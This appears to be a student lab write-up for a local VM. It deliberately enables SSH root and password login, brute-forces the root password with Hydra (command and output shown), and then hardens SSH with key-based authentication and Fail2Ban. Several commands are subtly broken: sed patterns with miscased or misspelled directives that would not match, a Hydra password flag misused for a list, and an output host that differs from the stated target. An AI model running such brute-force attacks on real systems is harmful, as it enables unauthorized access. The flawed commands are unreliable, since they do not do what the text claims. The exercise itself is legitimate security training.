# POC-TASK--2
✅ SETUP:

step 1: Enable ssh 
        
  # Update package list and install OpenSSH server
        ┌──(monish㉿vbox)-[~]
        └─$ sudo apt update && sudo apt install openssh-server -y

  # Enable ssh to start on boot
        ┌──(monish㉿vbox)-[~]
        └─$ sudo systemctl enable ssh

  # Verify ssh is running
        ┌──(monish㉿vbox)-[~]
        └─$ sudo systemctl status ssh

step 2: Allow Root login & Password Authentication
  
  # Allow root login
        ┌──(monish㉿vbox)-[~]
        └─$ sudo sed -i 's/#permitRootLogin prohibit-password/permitRootLogin yes/' /etc/ssh/sshd_config

  # Enable password-based authentication
        ┌──(monish㉿vbox)-[~]
        └─$ sudo sed -i 's/passwordaAuthentication no/passwordAuthentication yes/' /etc/ssh/sshd_config

  # Verify ssh is listening on port 
        ┌──(monish㉿vbox)-[~]
        └─$ ss -tlnp | grep ssh
        
✅ EXPLOIT: BRUTE-FORCE ATTACK:

step 3: perform a brute-force attack on ssh

  # Run Hydra brute-force attack on ssh
        ┌──(monish㉿vbox)-[~]
        └─$ hydra -l root -p passwords.txt ssh://10.0.2.15 -t 4

  Hydra (https://github.com/van-thc/thc-hydra) starting at 2025-03-17 20:40:6
  [DATA] max 4 tasks per 1 server, overall 4 tasks, 5 login tries (l:1/p:5), ~2 tries per task
  [DATA] attacking ssh://10.0.2.15/
  [22][ssh] host: 178.0.0.9   login: root   password: @@@@
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/van-thc/thc-hydra) finished at 2025-03-17 20:40:9

✅ MITIGATION:

 step 4: ssh hardening & mitigation

   # Disable root login for ssh
        ┌──(monish㉿vbox)-[~]
        └─$ sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config

   # Enable key-based authentication
        ┌──(monish㉿vbox)-[~]
        └─$ mkdir -p ~/.ssh && chmod 700 ~/.ssh

   # Generate ssh key pair
        ┌──(monish㉿vbox)-[~]
        └─$ ssh-keygen -t rsa -b 4096

   Generating public/private rsa key pair.
   Enter file in which to save the key (/home/monish/.ssh/id_rsa): 
   Enter passphrase for "/home/monish/.ssh/id_rsa" (empty for no passphrase): 
   Enter same passphrase again: 
   Your identification has been saved in /home/monish/.ssh/id_rs
   Your public key has been saved in /home/monish/.ssh/id_rsa.pub
   The key fingerprint is:
   SHA256:*********************************** 
   The key's randomart image is:
   
   +---[RSA 4096]----+
   
   |  .=o+*+=B*= .   |
   
   |  ..O=.+*B=.o    |
   
   |   =.oo .E=  .   |
   
   |    .  ..o. . .  |
   
   |        S  . + . |
   
   |            = ...|
   
   |           o oo o|
   
   |            . .+ |
   
   |             ..  |
   
   +----[SHA256]-----+

   # Disable password authentication 
        ┌──(monish㉿vbox)-[~]
        └─$ sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

   # Reset ssh to apply changes
        ┌──(monish㉿vbox)-[~]
        └─$  sudo systemctl restart ssh

step 5: Prevent Brute-force Attacks with Fail2Ban

   # Install Fail2Ban
        ┌──(monish㉿vbox)-[~]
        └─$ sudo apt install -y fail2ban

   # Enable and start Fail2Ban
        ┌──(monish㉿vbox)-[~]
        └─$ sudo systemctl enable fail2ban
        sudo systemctl start fail2ban

   # Configure Fail2Ban for ssh protection
        ┌──(monish㉿vbox)-[~]
        └─$ sudo nano /etc/fail2ban/jail.local

   # Restart Fail2Ban to apply settings
        ┌──(monish㉿vbox)-[~]
        └─$ sudo systemctl restart fail2ban
   
   # Check Fail2Ban status for SSH
         ┌──(monish㉿vbox)-[~]
         └─$ sudo fail2ban-client status sshd

   # Login in Root
          ┌──(monish㉿vbox)-[~]
          └─$ ssh root@178.0.0.9
